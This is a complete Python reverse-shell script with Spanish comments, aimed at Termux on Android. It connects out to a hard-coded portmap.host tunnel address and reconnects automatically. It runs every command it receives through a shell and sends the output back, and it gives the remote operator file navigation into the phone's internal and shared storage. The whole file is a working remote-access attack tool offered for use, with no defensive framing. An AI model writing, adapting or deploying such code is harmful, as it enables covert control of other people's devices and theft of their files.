#!/usr/bin/env python3
"""
REVERSE SHELL COMPLETA PARA TERMUX/ANDROID
Con soporte completo para navegación de archivos
"""

import socket
import subprocess
import os
import sys
import time
import platform
import shlex
import pty
import select

# ===== CONFIGURACIÓN =====
HOST = "Astrazam-37147.portmap.host"
PORT = 37147
# =========================

class TermuxShell:
    def __init__(self, sock):
        self.sock = sock
        self.current_dir = os.getcwd()
        self.shell = self.get_shell()
        self.hostname = platform.node()
        self.user = os.getenv('USER', 'termux')
        
    def get_shell(self):
        """Detectar el shell correcto para Termux"""
        if os.path.exists('/data/data/com.termux'):
            return "/data/data/com.termux/files/usr/bin/bash"
        elif os.path.exists('/bin/bash'):
            return "/bin/bash"
        else:
            return "/bin/sh"
    
    def send_prompt(self):
        """Enviar prompt con directorio actual"""
        prompt = f"\n\033[1;32m{self.user}@{self.hostname}\033[0m:\033[1;34m{self.current_dir}\033[0m$ "
        self.sock.sendall(prompt.encode())
    
    def change_directory(self, new_path):
        """Cambiar directorio manteniendo el estado"""
        try:
            if new_path == "..":
                os.chdir("..")
            elif new_path.startswith("/"):
                os.chdir(new_path)
            elif new_path.startswith("~"):
                # Expandir directorio home
                home_dir = os.path.expanduser("~")
                if new_path == "~":
                    os.chdir(home_dir)
                elif new_path == "~/storage":
                    storage_path = os.path.join(home_dir, "storage")
                    if os.path.exists(storage_path):
                        os.chdir(storage_path)
                    else:
                        self.sock.sendall(b"[-] Directorio storage no encontrado\n")
                        return
                else:
                    # Expandir otros paths con ~
                    expanded = os.path.expanduser(new_path)
                    if os.path.exists(expanded):
                        os.chdir(expanded)
                    else:
                        self.sock.sendall(f"[-] Directorio no encontrado: {new_path}\n".encode())
                        return
            else:
                # Path relativo
                os.chdir(new_path)
            
            # Actualizar directorio actual
            self.current_dir = os.getcwd()
            self.sock.sendall(f"[+] Directorio cambiado a: {self.current_dir}\n".encode())
            
        except FileNotFoundError:
            self.sock.sendall(f"[-] Directorio no encontrado: {new_path}\n".encode())
        except PermissionError:
            self.sock.sendall(f"[-] Permiso denegado para: {new_path}\n".encode())
        except Exception as e:
            self.sock.sendall(f"[-] Error: {str(e)}\n".encode())
    
    def list_directory(self, args=""):
        """Listar directorio con opciones"""
        try:
            # Si no hay args, usar ls -la
            if not args:
                cmd = ["ls", "-la", "--color=auto"]
            else:
                cmd = ["ls"] + shlex.split(args)
            
            # Si el directorio no es el actual, listar ese
            if args and not args.startswith("-"):
                # Verificar si es un path
                target_dir = args.split()[0] if " " in args else args
                if os.path.exists(target_dir) and os.path.isdir(target_dir):
                    cmd.append(target_dir)
            
            # Ejecutar ls
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                cwd=self.current_dir
            )
            
            if result.stdout:
                self.sock.sendall(result.stdout.encode())
            if result.stderr:
                self.sock.sendall(result.stderr.encode())
                
        except Exception as e:
            self.sock.sendall(f"[-] Error en ls: {str(e)}\n".encode())
    
    def execute_command(self, cmd):
        """Ejecutar comando del sistema"""
        try:
            # Limpiar el comando
            cmd = cmd.strip()
            
            # Comandos especiales manejados internamente
            if cmd.lower() in ["exit", "quit"]:
                self.sock.sendall(b"\n[!] Saliendo de la shell...\n")
                return False
            
            elif cmd.startswith("cd "):
                # Manejar cd internamente
                path = cmd[3:].strip()
                if not path:
                    path = os.path.expanduser("~")
                self.change_directory(path)
                return True
                
            elif cmd.startswith("ls"):
                # Manejar ls internamente
                args = cmd[2:].strip()
                self.list_directory(args)
                return True
                
            elif cmd == "pwd":
                # Mostrar directorio actual
                self.sock.sendall(f"{self.current_dir}\n".encode())
                return True
                
            else:
                # Comandos del sistema normales
                try:
                    # Usar shell=True para mantener variables de entorno
                    result = subprocess.run(
                        cmd,
                        shell=True,
                        capture_output=True,
                        text=True,
                        cwd=self.current_dir,
                        timeout=30
                    )
                    
                    # Enviar output
                    if result.stdout:
                        self.sock.sendall(result.stdout.encode())
                    if result.stderr:
                        self.sock.sendall(result.stderr.encode())
                        
                except subprocess.TimeoutExpired:
                    self.sock.sendall(b"\n[!] Timeout: Comando tardando demasiado\n")
                except Exception as e:
                    self.sock.sendall(f"[-] Error ejecutando comando: {str(e)}\n".encode())
                
                return True
                
        except Exception as e:
            self.sock.sendall(f"[-] Error: {str(e)}\n".encode())
            return True
    
    def start_interactive(self):
        """Iniciar shell interactiva"""
        # Enviar banner
        banner = f"""
{'='*60}
🚀 REVERSE SHELL COMPLETA - TERMUX
{'='*60}
Host: {self.hostname}
User: {self.user}
Shell: {self.shell}
Directorio inicial: {self.current_dir}
Sistema: {platform.system()} {platform.release()}
{'='*60}
[+] Acceso completo a:
    • cd, ls, pwd, cat, nano, etc.
    • ~/storage (almacenamiento interno)
    • ~/storage/shared (almacenamiento compartido)
    • /data/data/com.termux/files/home
{'='*60}
[+] Tips:
    • cd ~/storage       # Para acceder al almacenamiento
    • cd ~/storage/shared # Para archivos compartidos
    • ls -la            # Ver archivos con permisos
    • pwd               # Ver directorio actual
{'='*60}\n
"""
        self.sock.sendall(banner.encode())
        
        # Bucle principal
        while True:
            try:
                # Enviar prompt
                self.send_prompt()
                
                # Recibir comando
                data = self.sock.recv(4096).decode().strip()
                
                if not data:
                    break
                
                # Ejecutar comando
                if not self.execute_command(data):
                    break
                    
            except socket.timeout:
                # Mantener conexión viva
                self.sock.sendall(b"\n[!] Timeout - Conexion activa\n")
                continue
            except Exception as e:
                self.sock.sendall(f"\n[!] Error: {str(e)}\n".encode())
                break

def main():
    """Función principal con reconexión automática"""
    print(f"[+] Reverse Shell Termux - Conectando a {HOST}:{PORT}")
    
    while True:
        try:
            # Crear socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((HOST, PORT))
            sock.settimeout(None)  # Sin timeout después de conectar
            
            print("[+] Conexión establecida")
            
            # Crear y iniciar shell
            shell = TermuxShell(sock)
            shell.start_interactive()
            
            # Si llegamos aquí, la shell terminó
            sock.close()
            print("[-] Shell cerrada - Reconectando en 3s...")
            time.sleep(3)
            
        except KeyboardInterrupt:
            print("\n[!] Interrumpido por usuario")
            sys.exit(0)
        except ConnectionRefusedError:
            print("[-] Conexión rechazada - Verifica portmap.io")
            time.sleep(5)
        except socket.timeout:
            print("[-] Timeout - Reintentando...")
            time.sleep(3)
        except Exception as e:
            print(f"[-] Error: {e} - Reconectando...")
            time.sleep(3)

if __name__ == "__main__":
    main()
